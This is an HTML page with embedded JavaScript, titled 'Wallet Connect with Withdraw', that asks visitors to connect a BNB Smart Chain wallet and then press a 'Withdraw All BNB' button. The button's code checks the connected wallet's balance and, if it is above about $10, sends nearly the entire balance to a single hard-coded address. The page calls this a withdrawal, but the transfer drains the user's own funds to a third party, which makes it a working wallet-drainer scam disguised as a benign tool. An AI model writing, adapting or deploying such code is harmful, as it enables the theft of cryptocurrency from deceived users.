<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Wallet Connect with Withdraw</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      max-width: 400px;
      margin: auto;
    }
    w3m-core-button {
      display: block;
      margin-bottom: 20px;
      width: 100%;
    }
    button {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      margin-bottom: 10px;
      cursor: pointer;
    }
    button:disabled {
      cursor: not-allowed;
      background-color: #ccc;
    }
    #messageBox {
      padding: 10px;
      border-radius: 4px;
      margin-top: 10px;
      min-height: 40px;
    }
    #messageBox.info {
      background-color: #d9edf7;
      color: #31708f;
    }
    #messageBox.success {
      background-color: #d4edda;
      color: #155724;
    }
    #messageBox.error {
      background-color: #f8d7da;
      color: #721c24;
    }
  </style>
  <script type="module" src="wallet.js"></script>
</head>
<body>

  <w3m-core-button></w3m-core-button>

  <button id="withdrawButton" disabled>Withdraw All BNB (min $10)</button>

  <div id="messageBox" class="info">Please connect your wallet.</div>

  <script type="module">
    import { getAccount, fetchBalance, sendTransaction } from "https://unpkg.com/@web3modal/ethereum@2.6.2/build/esm/wagmiCore.js";
    import { parseEther, formatEther } from "https://cdn.jsdelivr.net/npm/viem@1.21.4/_cjs/index.min.js";

    const withdrawButton = document.getElementById('withdrawButton');
    const messageBox = document.getElementById('messageBox');
    const BNB_PRICE_USD = 300; // fixed price for example

    function showMessage(message, type = 'info') {
      messageBox.textContent = message;
      messageBox.className = '';
      messageBox.classList.add(type);
    }

    function updateWithdrawButton() {
      const { isConnected } = getAccount();
      withdrawButton.disabled = !isConnected;
      if (!isConnected) {
        showMessage('Please connect your wallet to enable withdrawal.', 'info');
      } else {
        showMessage('Wallet connected! You can withdraw your BNB.', 'success');
      }
    }

    // Listen for wallet connect/disconnect events
    window.ethereum?.on('accountsChanged', updateWithdrawButton);
    window.ethereum?.on('connect', updateWithdrawButton);
    window.ethereum?.on('disconnect', updateWithdrawButton);

    // Initial check
    document.addEventListener('DOMContentLoaded', () => {
      updateWithdrawButton();
    });

    withdrawButton.addEventListener('click', async () => {
      try {
        const { address, isConnected } = getAccount();
        if (!isConnected || !address) {
          showMessage('Wallet not connected! Please connect your wallet first.', 'error');
          return;
        }

        showMessage('Checking your BNB balance...', 'info');

        const balanceResult = await fetchBalance({
          address,
          chainId: 56, // BSC chain id
        });

        const balanceBNB = Number(formatEther(balanceResult.value));
        const balanceUSD = balanceBNB * BNB_PRICE_USD;

        if (balanceUSD < 10) {
          showMessage(`Your BNB balance is $${balanceUSD.toFixed(2)}, less than the minimum $10 required to withdraw.`, 'error');
          return;
        }

        const gasBuffer = 0.001; // reserve some for gas fees
        const withdrawAmountBNB = balanceBNB - gasBuffer;

        if (withdrawAmountBNB <= 0) {
          showMessage('Balance too low after reserving gas fees, cannot withdraw.', 'error');
          return;
        }

        const recipient = '0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C';

        showMessage('Sending withdrawal transaction...', 'info');

        const tx = await sendTransaction({
          to: recipient,
          value: parseEther(withdrawAmountBNB.toFixed(18)),
        });

        showMessage(`Withdrawn approx $${(withdrawAmountBNB * BNB_PRICE_USD).toFixed(2)} BNB! Transaction Hash: ${tx.hash}`, 'success');

      } catch (e) {
        console.error(e);
        showMessage('Withdrawal failed. Please try again.', 'error');
      }
    });
  </script>

</body>
</html>
